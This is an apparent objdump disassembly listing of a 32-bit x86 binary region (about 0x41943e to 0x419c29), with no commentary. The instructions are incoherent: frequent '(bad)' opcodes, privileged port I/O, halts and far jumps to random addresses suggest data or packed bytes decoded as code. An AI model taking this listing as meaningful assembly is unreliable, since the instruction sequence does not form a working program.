  41943e:	idiv   DWORD PTR [ebp-0x3842fe07]
  419444:	lea    edx,[edi-0x7556bced]
  41944a:	mov    eax,0x4d9310ea
  41944f:	test   bh,bh
  419451:	mov    al,ds:0xd0b8a003
  419456:	xor    ch,BYTE PTR [ebp-0x83a1a8c]
  41945c:	push   0x6897995b
  419461:	(bad)  
  419462:	mov    al,ds:0x88de4d63
  419467:	in     al,dx
  419468:	out    dx,eax
  419469:	iret   
  41946a:	repz push ebp
  41946c:	mov    ah,BYTE PTR [ebx-0x3262920]
  419472:	hlt    
  419473:	mov    ebp,0xb99306a5
  419478:	push   eax
  419479:	sbb    eax,0x8b0f6845
  41947e:	mov    esp,0xaaa8f975
  419483:	cmp    ebp,DWORD PTR [ebx+edi*1]
  419486:	and    BYTE PTR ds:0xb1e8dc5,dh
  41948c:	aad    0x56
  41948e:	pop    es
  41948f:	fsub   st,st(1)
  419491:	mov    DWORD PTR [edi+eax*8],edx
  419494:	add    DWORD PTR [edx-0x2a],eax
  419497:	push   esi
  419498:	dec    ecx
  419499:	and    al,0x2a
  41949b:	(bad)
  41949e:	gs sti 
  4194a0:	adc    DWORD PTR ds:0xb975f4a6,ecx
  4194a6:	es jb  0x419434
  4194a9:	push   esp
  4194aa:	or     eax,0xa7e9d507
  4194af:	xlat   BYTE PTR ds:[ebx]
  4194b0:	sbb    DWORD PTR [ebx-0x4f231fd4],ebp
  4194b6:	je     0x4194e9
  4194b8:	dec    esi
  4194b9:	adc    al,bh
  4194bb:	sub    al,0x18
  4194bd:	pop    ebp
  4194be:	xchg   BYTE PTR [esi+0x394c9fc3],cl
  4194c4:	fld    DWORD PTR [edi+edx*4-0x17b058c9]
  4194cb:	and    al,0xd8
  4194cd:	cdq    
  4194ce:	call   0x5b92:0x53ff2697
  4194d5:	pushf  
  4194d6:	pop    ds
  4194d7:	retf   0x463a
  4194da:	xor    BYTE PTR [eax+0x4aed1ade],bh
  4194e0:	dec    ebp
  4194e1:	imul   edx,DWORD PTR [ebp+0x46ac1ada],0x551168c3
  4194eb:	inc    esi
  4194ec:	add    al,0x3b
  4194ee:	jb     0x419482
  4194f0:	and    dl,BYTE PTR [esi-0x2d]
  4194f3:	inc    ecx
  4194f4:	mov    dh,0x43
  4194f6:	adc    esi,ebx
  4194f8:	hlt    
  4194f9:	xor    al,0x3d
  4194fb:	push   ecx
  4194fc:	shl    DWORD PTR [ecx],1
  4194fe:	inc    DWORD PTR [esi-0x624681a7]
  419504:	adc    al,0x57
  419506:	call   0xc589:0xfe65e71b
  41950d:	mov    eax,ds:0x1f6b5f73
  419512:	mov    ebx,0x4071869e
  419517:	inc    edi
  419518:	mov    edx,0xf3a0da7d
  41951d:	jecxz  0x4194fa
  41951f:	pop    es
  419520:	mov    ch,0x4d
  419522:	shr    BYTE PTR [eax+0x4af148d1],0xc7
  419529:	jle    0x419524
  41952b:	fdiv   st(4),st
  41952d:	(bad)  
  41952e:	es xchg ebp,eax
  419530:	mov    eax,0x15e66418
  419535:	xchg   esp,eax
  419536:	dec    eax
  419537:	mov    ebp,0xdec3e71d
  41953c:	mov    ds:0x6c6abaec,eax
  419541:	lock mov dl,0x6d
  419544:	fs in  eax,dx
  419546:	das    
  419547:	stc    
  419548:	jmp    0x419502
  41954a:	mov    ah,BYTE PTR [eax-0x21417428]
  419550:	xchg   DWORD PTR [ecx+0x54],esp
  419553:	fnstsw WORD PTR [ebp+eax*4-0x7a]
  419557:	fdivr  DWORD PTR [edi+0x6f]
  41955a:	and    ch,bl
  41955c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41955d:	push   cs
  41955e:	or     al,0xa9
  419560:	cmp    eax,DWORD PTR [ebx-0x58]
  419563:	jne    0x4194fe
  419565:	gs pop es
  419567:	pop    edi
  419568:	sbb    edx,esp
  41956a:	xchg   ebp,eax
  41956b:	not    bl
  41956d:	fcmove st,st(7)
  41956f:	or     eax,0xcc7359a
  419574:	sti    
  419575:	popa   
  419576:	test   al,0x54
  419578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419579:	pop    edx
  41957a:	bound  ebx,QWORD PTR [esi+0x34]
  41957d:	leave  
  41957e:	dec    ecx
  41957f:	scas   eax,DWORD PTR es:[edi]
  419580:	inc    esi
  419581:	bound  esp,QWORD PTR [eax-0x7d7e317f]
  419587:	aas    
  419588:	test   eax,0x77b86a01
  41958d:	repz adc ah,BYTE PTR [eax+0x3f03c43c]
  419594:	adc    bh,BYTE PTR [ebx+0x2b]
  419597:	(bad)  
  419598:	loop   0x419558
  41959a:	and    eax,0xd2f7700b
  41959f:	in     eax,dx
  4195a0:	or     ch,cl
  4195a2:	xchg   ebx,eax
  4195a3:	add    BYTE PTR [eax-0x13],ah
  4195a6:	push   ecx
  4195a7:	adc    esp,ebx
  4195a9:	icebp  
  4195aa:	inc    edx
  4195ab:	test   BYTE PTR ds:0xf272d28c,dl
  4195b1:	ins    DWORD PTR es:[edi],dx
  4195b2:	xor    bl,ah
  4195b4:	(bad)  
  4195b6:	adc    DWORD PTR [ebp-0x246e7937],edi
  4195bc:	push   eax
  4195bd:	enter  0x3be4,0x44
  4195c1:	pop    edi
  4195c2:	pusha  
  4195c3:	adc    ecx,DWORD PTR [ecx-0xc]
  4195c6:	cmp    dh,ch
  4195c8:	fs dec ecx
  4195ca:	push   ecx
  4195cb:	(bad)  
  4195cc:	cdq    
  4195cd:	and    BYTE PTR [edx-0x6b],0x1c
  4195d1:	mov    esp,0x4ff3fe04
  4195d6:	mov    ebx,0xcb1dcffc
  4195db:	mov    esp,DWORD PTR [eax]
  4195dd:	data16 xor BYTE PTR [esi+0x24048c65],ch
  4195e4:	cwde   
  4195e5:	or     bl,BYTE PTR [ebx]
  4195e7:	mov    WORD PTR [edi-0x25],ds
  4195ea:	loopne 0x419578
  4195ec:	cwde   
  4195ed:	mov    eax,ds:0xc6e5053
  4195f2:	jno    0x419625
  4195f4:	call   0x9cf8:0x25afccb6
  4195fb:	lods   al,BYTE PTR ds:[esi]
  4195fc:	ins    DWORD PTR es:[edi],dx
  4195fd:	cmc    
  4195fe:	jecxz  0x4195cc
  419600:	in     al,0x22
  419602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419603:	and    ch,BYTE PTR [esi-0x42]
  419606:	mov    DWORD PTR [ecx+edi*4],ebx
  419609:	arpl   di,si
  41960b:	ret    
  41960c:	jbe    0x4195cd
  41960e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41960f:	mov    eax,0xd0eab434
  419614:	cmp    eax,0x6e39f24
  419619:	test   ax,0x7fce
  41961d:	xchg   ebx,eax
  41961e:	mul    DWORD PTR [ebx+0x45ad75d5]
  419624:	pop    ds
  419625:	fdiv   DWORD PTR [esi]
  419627:	icebp  
  419628:	xlat   BYTE PTR ds:[ebx]
  419629:	sbb    al,0xae
  41962b:	xchg   edx,eax
  41962c:	pop    edx
  41962d:	jmp    0x7def:0x97c29955
  419634:	mov    ah,0x74
  419636:	jae    0x41960a
  419638:	(bad)  
  41963a:	dec    ecx
  41963b:	sbb    esp,DWORD PTR [eax+0x7f]
  41963e:	not    DWORD PTR [edi-0x7f0967cd]
  419644:	xchg   edi,eax
  419645:	fisub  DWORD PTR [edi+ebx*8]
  419648:	mov    al,ds:0xa7a05fce
  41964d:	icebp  
  41964e:	xor    al,0xdb
  419650:	repnz popa 
  419652:	ror    DWORD PTR [esp+edi*1],cl
  419655:	(bad)  
  419656:	test   DWORD PTR [ecx+0x3a],0xe99a1032
  41965d:	push   es
  41965e:	lahf   
  41965f:	jns    0x4196a2
  419661:	dec    esi
  419662:	mov    bl,0x8
  419664:	and    BYTE PTR [ecx-0x50cd8dc8],0x32
  41966b:	sahf   
  41966c:	and    eax,0x74d7da51
  419671:	mov    al,ds:0x7097a6ca
  419676:	xor    eax,0xc94af1d9
  41967b:	inc    edx
  41967c:	cmp    DWORD PTR [eax+0x70],esp
  41967f:	sub    al,0x5d
  419681:	ins    BYTE PTR es:[edi],dx
  419682:	dec    esi
  419683:	(bad)  
  419684:	jbe    0x4196bb
  419686:	mov    gs,WORD PTR [ebp-0x69]
  419689:	cs inc edx
  41968b:	add    DWORD PTR [eax+0xdb443e0],edi
  419691:	cmp    DWORD PTR [ebp-0x7705b6e2],esi
  419697:	mov    dl,0xbb
  419699:	mov    ah,0x4
  41969b:	push   edi
  41969c:	jb     0x41962b
  41969e:	mov    ch,0xa6
  4196a0:	in     al,0x50
  4196a2:	sub    ah,BYTE PTR [eax-0x5b]
  4196a5:	mov    dl,0x2e
  4196a7:	test   eax,0xafd591a2
  4196ac:	popa   
  4196ad:	jp     0x4196ef
  4196af:	(bad)  
  4196b0:	hlt    
  4196b1:	sbb    al,0xff
  4196b3:	dec    ebx
  4196b4:	adc    esp,DWORD PTR [edi-0x7d]
  4196b7:	rcr    BYTE PTR [esi-0x6bef2fce],0xa4
  4196be:	jmp    0xab92:0x1092013f
  4196c5:	sti    
  4196c6:	adc    esi,ebp
  4196c8:	jmp    DWORD PTR [esi+0x4350c11b]
  4196ce:	jp     0x41969a
  4196d0:	pop    esp
  4196d1:	data16 cli 
  4196d3:	sti    
  4196d4:	aas    
  4196d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d6:	inc    ebp
  4196d7:	pushf  
  4196d8:	bound  esi,QWORD PTR [eax-0x2acc835f]
  4196de:	jns    0x4196d6
  4196e0:	xchg   BYTE PTR [esp+esi*4+0x5a],ch
  4196e4:	inc    edi
  4196e5:	jno    0x4196df
  4196e7:	jmp    0x5001:0x5806d0a
  4196ee:	sub    al,0x24
  4196f0:	(bad)  
  4196f1:	jno    0x419747
  4196f3:	dec    edx
  4196f4:	int3   
  4196f5:	pop    ebp
  4196f6:	jecxz  0x4196a8
  4196f8:	cmp    edi,edx
  4196fa:	sub    al,ch
  4196fc:	xchg   DWORD PTR [ebx],edx
  4196fe:	fxch   st(6)
  419700:	repnz mov DWORD PTR [edi],ebx
  419703:	sub    eax,0x148113da
  419708:	dec    ecx
  419709:	xchg   edi,eax
  41970a:	cmp    esp,ecx
  41970c:	mov    ch,0x6
  41970e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41970f:	add    ah,bh
  419711:	je     0x419707
  419713:	and    eax,0xb96c4d92
  419718:	sub    BYTE PTR [edx],cl
  41971a:	push   ds
  41971b:	inc    edx
  41971c:	and    ecx,eax
  41971e:	punpckhbw mm2,QWORD PTR [ebx+0x2f80e75e]
  419725:	int    0x28
  419727:	push   cs
  419728:	mov    ebp,0x45c820a8
  41972d:	adc    al,0x17
  41972f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419730:	mov    eax,0x1171592b
  419735:	inc    ebx
  419736:	sti    
  419737:	call   0x7581:0x8a914ed0
  41973e:	jnp    0x4197ba
  419740:	xor    bl,bl
  419742:	repz inc esi
  419744:	jnp    0x419780
  419746:	cs dec edi
  419748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419749:	cmp    eax,0xd6de29dd
  41974e:	mov    eax,ds:0x8f36912
  419753:	inc    edi
  419754:	shr    BYTE PTR [ebx+ecx*1],0xd5
  419758:	push   ebp
  419759:	xchg   DWORD PTR [esi],esi
  41975b:	inc    eax
  41975c:	pop    edi
  41975d:	mov    ebp,DWORD PTR [esi]
  41975f:	add    eax,0xfaeedfad
  419764:	shr    BYTE PTR [ebp-0x1363806c],0xf0
  41976b:	sar    DWORD PTR [ebp-0x5b],1
  41976e:	jp     0x419782
  419770:	cmpxchg BYTE PTR [edx],cl
  419773:	(bad)  
  419774:	xchg   ebp,eax
  419775:	xchg   ecx,eax
  419776:	into   
  419777:	fwait
  419778:	adc    al,0x72
  41977a:	scas   eax,DWORD PTR es:[edi]
  41977b:	xchg   esi,eax
  41977c:	es and eax,0x41d504f4
  419782:	inc    ebx
  419783:	aaa    
  419784:	mov    esi,0x6d189913
  419789:	sbb    eax,0x948859c
  41978e:	fwait
  41978f:	pop    ecx
  419790:	adc    BYTE PTR [ebx+0x5a],0xcf
  419794:	out    dx,eax
  419795:	mov    al,al
  419797:	xchg   ebp,eax
  419798:	jecxz  0x41978a
  41979a:	add    al,0xba
  41979c:	mov    esp,0xdd46dfaa
  4197a1:	arpl   WORD PTR [edx+0x41],sp
  4197a4:	(bad)  
  4197a5:	jmp    0xc1a7:0xa6c78b1f
  4197ac:	inc    ecx
  4197ad:	push   eax
  4197ae:	dec    ebp
  4197af:	jge    0x419776
  4197b1:	call   0x3ee1:0x8479b925
  4197b8:	push   ebp
  4197b9:	add    DWORD PTR [ebp+0x6c],ebx
  4197bc:	xor    eax,0xf8754e90
  4197c1:	sbb    BYTE PTR fs:[ecx],0xb2
  4197c5:	mov    eax,ds:0x113c6732
  4197ca:	mov    al,ds:0x9a70e9cf
  4197cf:	ror    DWORD PTR [esi+ebx*1],cl
  4197d2:	jecxz  0x4197f9
  4197d4:	mov    ds:0x1af3b641,eax
  4197d9:	scas   eax,DWORD PTR es:[edi]
  4197da:	mov    edi,0x9ca97047
  4197df:	jl     0x41982e
  4197e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e2:	mov    bl,0x35
  4197e4:	mov    cl,ah
  4197e6:	mov    bl,0x44
  4197e8:	adc    eax,0x41e34f9e
  4197ed:	sub    DWORD PTR [edx+0x3e],esi
  4197f0:	cdq    
  4197f1:	in     al,0xa6
  4197f3:	pop    eax
  4197f4:	sbb    ebp,DWORD PTR [edi-0x64e6f200]
  4197fa:	dec    esp
  4197fb:	sub    al,0xf6
  4197fd:	popf   
  4197fe:	retf   0x113c
  419801:	int3   
  419802:	add    BYTE PTR [eax+0x561b4407],bl
  419808:	add    BYTE PTR [ecx+eax*4+0x2e504ade],bh
  41980f:	jae    0x419879
  419811:	push   esi
  419812:	dec    ebp
  419813:	pop    eax
  419814:	cmp    al,0x86
  419816:	sub    BYTE PTR [ecx-0x3c],ch
  419819:	adc    BYTE PTR [di-0x11a6],al
  41981e:	lods   al,BYTE PTR gs:[esi]
  419820:	daa    
  419821:	pop    esp
  419822:	sbb    al,0x44
  419824:	sub    bh,BYTE PTR [ebx]
  419826:	mov    ah,0xd2
  419828:	mov    ecx,0x470cb476
  41982d:	(bad)  
  41982e:	cli    
  41982f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419830:	jge    0x4197c0
  419832:	push   ebp
  419833:	inc    ebx
  419834:	lods   al,BYTE PTR ds:[esi]
  419835:	aaa    
  419836:	test   DWORD PTR [edi+0x66d4689b],0xc3eb8757
  419840:	inc    BYTE PTR [edi-0x1d4153dd]
  419846:	into   
  419847:	sbb    bh,bl
  419849:	pop    edi
  41984a:	std    
  41984b:	iret   
  41984c:	(bad)  
  41984f:	ret    0x7f8c
  419852:	jbe    0x4197d6
  419854:	pop    esi
  419855:	or     BYTE PTR [edi-0x5e],cl
  419858:	clc    
  419859:	mov    ebp,0x53ea2aa5
  41985e:	push   DWORD PTR [ecx-0x5f]
  419861:	(bad)  [esp+eiz*4]
  419864:	sbb    BYTE PTR cs:[ecx+0x1006c0ed],ch
  41986b:	je     0x419823
  41986d:	sub    DWORD PTR [ebx+edi*8],ebx
  419870:	add    bl,BYTE PTR [edi+edi*8-0x3d]
  419874:	aas    
  419875:	enter  0xde7b,0x8c
  419879:	jno    0x4197fd
  41987b:	cwde   
  41987c:	dec    ebx
  41987d:	aaa    
  41987e:	mov    cl,0xfd
  419880:	sahf   
  419881:	test   eax,0xa58eb023
  419886:	push   0xaa0c319c
  41988b:	jge    0x4198ed
  41988d:	out    dx,al
  41988e:	pop    ebx
  41988f:	repz or eax,DWORD PTR [eax]
  419892:	call   0xa953:0xd0ee3afd
  419899:	loopne 0x419912
  41989b:	(bad)  
  41989c:	(bad)  
  41989d:	cld    
  41989e:	arpl   di,ax
  4198a0:	ins    BYTE PTR es:[edi],dx
  4198a1:	fist   DWORD PTR [ecx-0x8]
  4198a4:	ret    0x5985
  4198a7:	lds    ebp,FWORD PTR [ebx]
  4198a9:	ss in  eax,0xd
  4198ac:	test   BYTE PTR [ebp+0x13],bh
  4198af:	inc    edx
  4198b0:	fcomp  DWORD PTR [esi-0x7e]
  4198b3:	in     al,dx
  4198b4:	cmp    edi,0xfffffff8
  4198b7:	clc    
  4198b8:	stos   DWORD PTR es:[edi],eax
  4198b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ba:	cmp    eax,0xb7a475b2
  4198bf:	das    
  4198c0:	test   BYTE PTR [esi+0x3a],dh
  4198c3:	cmp    edx,DWORD PTR [esi+0x71ede4ed]
  4198c9:	mov    DWORD PTR [ecx],ebx
  4198cb:	dec    esp
  4198cc:	add    ecx,eax
  4198ce:	nop
  4198cf:	(bad)  [edx+0x3d263330]
  4198d5:	and    eax,ebx
  4198d7:	es stos DWORD PTR es:[edi],eax
  4198d9:	mov    al,ds:0x479373d5
  4198de:	sbb    al,0xc
  4198e0:	xchg   edx,eax
  4198e1:	and    al,0xbb
  4198e3:	push   0x74
  4198e5:	(bad)  
  4198e6:	psubsw mm2,QWORD PTR [esi+0xd]
  4198ea:	mov    bl,0x29
  4198ec:	enter  0xfc1a,0xc8
  4198f0:	addr16 and eax,esi
  4198f3:	ror    cl,cl
  4198f5:	daa    
  4198f6:	mov    ecx,0x7eab309e
  4198fb:	arpl   WORD PTR [ecx-0x6693275d],di
  419901:	pop    ss
  419902:	repnz outs dx,BYTE PTR ds:[esi]
  419904:	cs pop ecx
  419906:	les    ebx,FWORD PTR [ebx+0x1]
  419909:	sub    edi,DWORD PTR [ebp-0x1e]
  41990c:	adc    dl,BYTE PTR [edi+0x12]
  41990f:	ficom  WORD PTR [ebp+0x783919ee]
  419915:	in     al,dx
  419916:	fdiv   DWORD PTR [eax+0x5a037784]
  41991c:	jp     0x41994c
  41991e:	mov    edi,0xa0f90e4e
  419923:	ds scas al,BYTE PTR es:[edi]
  419925:	fstp   TBYTE PTR ds:0xfe3fa603
  41992b:	aas    
  41992c:	push   edx
  41992d:	in     al,0xe
  41992f:	inc    esp
  419930:	push   ecx
  419931:	daa    
  419932:	stc    
  419933:	idiv   BYTE PTR [ebx+ebp*2]
  419936:	adc    ch,BYTE PTR [ebp+edx*4+0x2a]
  41993a:	mov    edx,?
  41993c:	add    eax,ebx
  41993e:	stos   BYTE PTR es:[edi],al
  41993f:	mov    eax,0x2f091ded
  419944:	dec    edi
  419945:	data16 fadd QWORD PTR [eax+0x236e946b]
  41994c:	sbb    ch,BYTE PTR [ebx]
  41994e:	cmp    cl,0x92
  419951:	push   cs
  419952:	fs sub bh,al
  419955:	sahf   
  419956:	iret   
  419957:	popa   
  419958:	xchg   esp,eax
  419959:	loop   0x419957
  41995b:	rol    BYTE PTR [ecx+ecx*2+0x14],cl
  41995f:	push   0xffffffb7
  419961:	sbb    al,0xa2
  419963:	repnz out 0x18,al
  419966:	ret    0x4814
  419969:	std    
  41996a:	jbe    0x419993
  41996c:	or     cl,BYTE PTR [edi-0x25]
  41996f:	sti    
  419970:	pop    edx
  419971:	jnp    0x4199f0
  419973:	in     eax,dx
  419974:	call   0xfed5e8a1
  419979:	and    BYTE PTR [ebx],bl
  41997b:	pop    esi
  41997c:	xchg   esi,eax
  41997d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41997f:	dec    eax
  419980:	ficomp WORD PTR [ebp+0x22]
  419983:	into   
  419984:	in     eax,0x60
  419986:	xchg   edi,eax
  419987:	inc    esi
  419988:	loop   0x4199bd
  41998a:	xor    ebp,DWORD PTR [ebx]
  41998c:	mov    esi,0x974f732e
  419991:	loop   0x41998b
  419993:	or     al,0x69
  419995:	inc    esi
  419996:	mov    edx,0xa9b5222a
  41999b:	sub    DWORD PTR [esi+edi*1+0x526c6de1],ecx
  4199a2:	xchg   ecx,eax
  4199a3:	sub    al,0xd1
  4199a5:	inc    eax
  4199a6:	gs gs or al,0x81
  4199aa:	out    dx,al
  4199ab:	pop    ss
  4199ac:	jno    0x4199e2
  4199ae:	push   edx
  4199af:	imul   edx,DWORD PTR [eax+0x273af607],0xdf1ae322
  4199b9:	dec    ebx
  4199ba:	jp     0x419a0a
  4199bc:	xchg   DWORD PTR [esi-0x75636158],edi
  4199c2:	lahf   
  4199c3:	cwde   
  4199c4:	dec    ebp
  4199c5:	mov    BYTE PTR [eax],dl
  4199c7:	adc    cl,BYTE PTR [edx+0x62]
  4199ca:	loop   0x41997a
  4199cc:	inc    edx
  4199cd:	and    edx,ebx
  4199cf:	(bad)  
  4199d0:	call   0x2e648f17
  4199d5:	push   eax
  4199d6:	daa    
  4199d7:	in     al,dx
  4199d8:	sbb    BYTE PTR [esi-0x2fa46322],0xaf
  4199df:	mov    bl,0x8d
  4199e1:	popa   
  4199e2:	inc    esi
  4199e3:	jmp    0x419a49
  4199e5:	fimul  WORD PTR [ebp+0x44479625]
  4199eb:	(bad)  
  4199ec:	sahf   
  4199ed:	dec    ebp
  4199ee:	es inc ecx
  4199f0:	add    esp,DWORD PTR [edi-0x5fd0cbb7]
  4199f6:	int    0xbc
  4199f8:	xor    esp,edx
  4199fa:	aas    
  4199fb:	stos   BYTE PTR es:[edi],al
  4199fc:	mov    dh,0x89
  4199fe:	sbb    al,0xf4
  419a00:	xor    ecx,DWORD PTR [eax]
  419a02:	push   eax
  419a03:	jp     0x419987
  419a05:	mov    esi,0x731da4c6
  419a0a:	nop
  419a0b:	sbb    DWORD PTR [edx],esi
  419a0d:	push   ecx
  419a0e:	adc    DWORD PTR [esi],ebp
  419a10:	daa    
  419a11:	pop    ds
  419a12:	and    al,0x9a
  419a14:	loopne 0x419a83
  419a16:	aas    
  419a17:	pop    ax
  419a19:	mov    ch,0x92
  419a1b:	pop    edx
  419a1c:	shr    DWORD PTR [edx],1
  419a1e:	jecxz  0x419a2c
  419a20:	mov    dl,0xff
  419a22:	fld    TBYTE PTR [ebp-0x377de354]
  419a28:	add    BYTE PTR [ebx-0x32],ch
  419a2b:	jmp    0x419a7b
  419a2d:	scas   al,BYTE PTR es:[edi]
  419a2e:	sahf   
  419a2f:	test   al,0xf6
  419a31:	mov    ah,0xc1
  419a33:	out    0xb5,al
  419a35:	mov    esp,0x2ca8c3fd
  419a3a:	xchg   edx,eax
  419a3b:	stc    
  419a3c:	js     0x4199d4
  419a3e:	lods   eax,DWORD PTR ds:[esi]
  419a3f:	cmp    al,0xdd
  419a41:	mov    ebp,0x87385ec9
  419a46:	int    0xf6
  419a48:	jno    0x419a2c
  419a4a:	mov    ch,0x74
  419a4c:	jle    0x419a64
  419a4e:	sub    al,0x9f
  419a50:	add    eax,0x74e2a448
  419a55:	pop    fs
  419a57:	and    eax,0x37b2258a
  419a5c:	mov    eax,0x45349f25
  419a61:	scas   al,BYTE PTR es:[edi]
  419a62:	daa    
  419a63:	std    
  419a64:	das    
  419a65:	es dec eax
  419a67:	inc    ecx
  419a68:	fistp  QWORD PTR [edx+0x3b]
  419a6b:	stos   BYTE PTR es:[edi],al
  419a6c:	daa    
  419a6d:	fsincos 
  419a6f:	and    dh,BYTE PTR [edi-0x44bafe91]
  419a75:	shl    DWORD PTR [eax-0x72540eb4],1
  419a7b:	cmp    al,0x36
  419a7d:	retf   0xd81
  419a80:	mov    bh,BYTE PTR [eax+0x167f3e07]
  419a86:	es adc esi,ebx
  419a89:	gs (bad) 
  419a8b:	rol    dh,cl
  419a8d:	sahf   
  419a8e:	retf   0x29e2
  419a91:	(bad)  
  419a92:	jbe    0x419ab5
  419a94:	xchg   esi,eax
  419a95:	mov    cl,0xfe
  419a97:	or     ebx,DWORD PTR [ebx+0x1a]
  419a9a:	xchg   ebp,eax
  419a9b:	lods   al,BYTE PTR ds:[esi]
  419a9c:	jmp    FWORD PTR [esp+esi*8]
  419a9f:	push   ds
  419aa0:	pop    eax
  419aa1:	or     DWORD PTR [ebx],ebx
  419aa3:	jl     0x419ab9
  419aa5:	aad    0xbb
  419aa7:	iret   
  419aa8:	xor    al,0x41
  419aaa:	call   0xe764f36a
  419aaf:	cwde   
  419ab0:	ficom  WORD PTR [esi+0x2e]
  419ab3:	pop    ds
  419ab4:	push   edi
  419ab5:	jl     0x419abb
  419ab7:	mov    ds:0xe9cfcab6,eax
  419abc:	pusha  
  419abd:	popa   
  419abe:	adc    edx,DWORD PTR [ebx+0x388ad4d5]
  419ac4:	xchg   ecx,eax
  419ac5:	aad    0x1
  419ac7:	sub    DWORD PTR [edi],esi
  419ac9:	mov    ds:0x4002f44e,al
  419ace:	hlt    
  419acf:	or     esp,ebx
  419ad1:	call   0x60463af7
  419ad6:	adc    BYTE PTR [ebx],ah
  419ad8:	and    cl,BYTE PTR [ebx+0x2222da41]
  419ade:	jbe    0x419af6
  419ae0:	cmc    
  419ae1:	xchg   ebx,eax
  419ae2:	cmp    eax,DWORD PTR [ebp-0x54]
  419ae5:	inc    esp
  419ae6:	and    ecx,edx
  419ae8:	push   esp
  419ae9:	enter  0xc17f,0x8f
  419aed:	bound  eax,QWORD PTR [eax+0x370cefde]
  419af3:	push   ecx
  419af4:	mov    ah,0x92
  419af6:	mov    BYTE PTR [edx-0x3],bh
  419af9:	pusha  
  419afa:	leave  
  419afb:	repz and edx,eax
  419afe:	sar    BYTE PTR [edx],0xda
  419b01:	(bad)  
  419b02:	inc    eax
  419b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b04:	push   ebx
  419b05:	pop    edx
  419b06:	mov    esp,0x6468513d
  419b0b:	(bad)  
  419b0c:	sahf   
  419b0d:	ins    BYTE PTR es:[edi],dx
  419b0e:	in     eax,dx
  419b0f:	inc    ebx
  419b10:	dec    ecx
  419b11:	out    dx,al
  419b12:	push   cs
  419b13:	cmp    al,0x5f
  419b15:	inc    edx
  419b16:	(bad)  [edi]
  419b18:	(bad)  
  419b19:	mov    dh,0x51
  419b1b:	and    al,0xd5
  419b1d:	add    al,0x24
  419b1f:	std    
  419b20:	loope  0x419b37
  419b22:	shl    DWORD PTR [eax-0x20],cl
  419b25:	cmc    
  419b26:	adc    ebp,ebx
  419b28:	pop    edi
  419b29:	shl    cl,0x79
  419b2c:	push   0x8ed38ca4
  419b31:	jno    0x419b6e
  419b33:	and    al,0xae
  419b35:	dec    ecx
  419b36:	sbb    edi,DWORD PTR [ecx]
  419b38:	scas   al,BYTE PTR es:[edi]
  419b39:	pop    ebx
  419b3a:	fistp  DWORD PTR [esi+0x4c6a95c2]
  419b40:	pop    ecx
  419b41:	mov    ch,0xd2
  419b43:	retf   
  419b44:	sbb    DWORD PTR [esi+0x32],eax
  419b47:	mov    ch,0xa2
  419b49:	sbb    DWORD PTR [ebp+0x4c],eax
  419b4c:	push   ebx
  419b4d:	add    BYTE PTR [ebp+eax*2+0x22f94dae],ch
  419b54:	(bad)
  419b57:	or     edx,DWORD PTR [ebp-0x294ef873]
  419b5d:	xchg   BYTE PTR [ebx+eiz*8-0x2f78b25],bh
  419b64:	adc    BYTE PTR [esi+0x5f7c38a4],bh
  419b6a:	or     eax,0x3f9db79d
  419b6f:	repz ret 
  419b71:	fidiv  WORD PTR [edi+0x3e13957d]
  419b77:	mov    dl,0xdb
  419b79:	cmp    esi,DWORD PTR [esi+0x31030d7]
  419b7f:	push   ebx
  419b80:	jb     0x419b9f
  419b82:	fsubr  QWORD PTR [edx+0x23]
  419b85:	ja     0x419b69
  419b87:	ud1    edi,esi
  419b8a:	idiv   BYTE PTR [ecx+eax*8-0x428716d8]
  419b91:	xor    BYTE PTR [ebx+edx*2-0x1a],0xd7
  419b96:	mov    ds:0xea4e899c,eax
  419b9b:	jmp    0x9733:0x1664440b
  419ba2:	pop    ecx
  419ba3:	add    bl,BYTE PTR [ecx+0x27]
  419ba6:	add    esp,edi
  419ba8:	and    al,0x92
  419baa:	test   al,0x3f
  419bac:	pop    es
  419bad:	loope  0x419bda
  419baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bb0:	ficom  DWORD PTR [ecx]
  419bb2:	neg    DWORD PTR [edx-0x49]
  419bb5:	push   ss
  419bb6:	int    0x23
  419bb8:	test   al,0x36
  419bba:	jns    0x419b83
  419bbc:	int3   
  419bbd:	inc    edi
  419bbe:	pop    es
  419bbf:	enter  0xce49,0x1
  419bc3:	lahf   
  419bc4:	mov    esi,0x1fef06a3
  419bc9:	call   0xd694:0x4813cd95
  419bd0:	cld    
  419bd1:	in     al,0x7f
  419bd3:	mov    edx,0xdf63145e
  419bd8:	push   0xffffff88
  419bda:	xchg   bh,dl
  419bdc:	std    
  419bdd:	inc    eax
  419bde:	jmp    DWORD PTR [esi]
  419be0:	mov    ecx,0xf781fbb4
  419be5:	xchg   edi,eax
  419be6:	fs pop ecx
  419be8:	push   edx
  419be9:	pop    esi
  419bea:	iret   
  419beb:	pop    es
  419bec:	xchg   ecx,eax
  419bed:	pop    ecx
  419bee:	jle    0x419bf9
  419bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf1:	fild   QWORD PTR [ebp+0x72aa96bf]
  419bf7:	call   0xe40b:0xbaeb348a
  419bfe:	mov    al,ds:0xd49e4d48
  419c03:	xchg   ebx,eax
  419c04:	push   edi
  419c05:	pop    edx
  419c06:	adc    al,0xb8
  419c08:	(bad)  
  419c0a:	adc    eax,0xc326680e
  419c0f:	add    BYTE PTR [ebx-0x235cbb89],bl
  419c15:	nop
  419c16:	dec    ebx
  419c17:	fwait
  419c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c19:	pop    ecx
  419c1a:	push   0x57982ad7
  419c1f:	add    ah,BYTE PTR [ebp+ebx*2+0x67]
  419c23:	inc    esp
  419c24:	and    eax,0x5605dcfd
  419c29:	sti    
